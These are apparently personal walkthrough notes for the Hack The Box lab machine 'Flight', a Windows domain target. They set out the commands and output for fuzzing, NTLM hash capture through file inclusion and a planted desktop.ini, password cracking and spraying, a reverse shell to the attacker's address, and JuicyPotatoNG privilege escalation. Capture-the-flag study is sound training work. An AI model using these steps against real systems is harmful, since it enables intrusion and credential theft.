# Flight

---

## Setup


---

## Enumeration

SMB Requires authentication

port 80:

dirScan:

```
gobuster dir -u http://flight.htb/ -w /usr/share/wordlists/diruster/directory-list-2.3-small.txt | tee dirScan
```

subdomains:

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://flight.htb -H "Host: FUZZ.flight.htb" -fw 1546 | tee subDomains
```

found school
school dirs:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://school.flight.htb/index.php?view=FUZZ.html -H "Host: school.flight.htb" -fw 144 | tee dirScan_school
```

LFI in http://school.flight.htb/index.php?view=LFI

rabbit hole

---

Kerberos user enum:

```
GetNPUsers.py -no-pass -usersfile /usr/share/wordlists/A-ZSurnames.txt -format hashcat -dc-ip $IP -outputfile users.txt flight.htb/
```

sudo responder -I tun0
http://school.flight.htb/index.php?view=//IP/share

got:

```
svc_apache::flight:f4cba6a8d459ab84:3EB91BA79E83ECD7680651B5638B1023:0101000000000000807D45B071F2D80194EE427896F0A47D000000000200080049004D004400450001001E00570049004E002D004C004D00500036004A004A00300054005A0053004E0004003400570049004E002D004C004D00500036004A004A00300054005A0053004E002E0049004D00440045002E004C004F00430041004C000300140049004D00440045002E004C004F00430041004C000500140049004D00440045002E004C004F00430041004C0007000800807D45B071F2D8010600040002000000080030003000000000000000000000000030000038C0BA53E4186A01827A75C5EA757935BE1F1B57382E8FF65338249F23DB4F5E0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320033000000000000000000
```

cracked using rockyou.txt

```
S@Ss!K@*t13      (svc_apache)
```

used smbclient and found Users share and found C.Bum user!
also crackmapexec user enum:

```
┌──(kali㉿kali)-[~/CTF/HTB-CTF/Machines/Flight]
└─$ crackmapexec smb $IP --users -u svc_apache -p 'S@Ss!K@*t13' 
SMB         10.129.147.189  445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.147.189  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.147.189  445    G0               [+] Enumerated domain user(s)
SMB         10.129.147.189  445    G0               flight.htb\O.Possum                       badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.129.147.189  445    G0               flight.htb\svc_apache                     badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.129.147.189  445    G0               flight.htb\V.Stevens                      badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.129.147.189  445    G0               flight.htb\D.Truff                        badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.129.147.189  445    G0               flight.htb\I.Francis                      badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.129.147.189  445    G0               flight.htb\W.Walker                       badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.129.147.189  445    G0               flight.htb\C.Bum                          badpwdcount: 0 baddpwdtime: 2022-09-22 16:50:15.815982
SMB         10.129.147.189  445    G0               flight.htb\M.Gold                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.129.147.189  445    G0               flight.htb\L.Kein                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.129.147.189  445    G0               flight.htb\G.Lors                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.129.147.189  445    G0               flight.htb\R.Cold                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.129.147.189  445    G0               flight.htb\S.Moon                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.129.147.189  445    G0               flight.htb\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.129.147.189  445    G0               flight.htb\Guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.129.147.189  445    G0               flight.htb\Administrator                  badpwdcount: 0 baddpwdtime: 2022-10-31 21:58:04.270
```

user S.Moon has same password as svc_apache:

```
└─$ crackmapexec smb $IP -u users.txt -p 'S@Ss!K@*t13' --users --continue-on-success
SMB         10.129.147.189  445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.147.189  445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.147.189  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.147.189  445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.147.189  445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.147.189  445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.147.189  445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.147.189  445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.147.189  445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.147.189  445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.147.189  445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.147.189  445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.147.189  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.129.147.189  445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.147.189  445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.147.189  445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE
```

S.Moon has read/write in Shared share.
used responder again and uploaded an infected desktop.ini in Shared:

```
[.ShellClassInfo]
IconResource=\\ip\share
```

cracked with john: 

```
Tikkycoll_431012284 (c.bum)
```

through smbclient go to Users/C.Bum/Desktop -> GET user flag!

revshell:

use RunasCs.exe c.bum Tikkycoll_431012284 powershell -r 10.10.16.23:1337 ----> Got shell as C.Bum

Found port 8000 running locally! running on different user

aspx revshell in C:\inetpub\development -> got user
run juicypotatong -> -t * -p cmd.exe -i
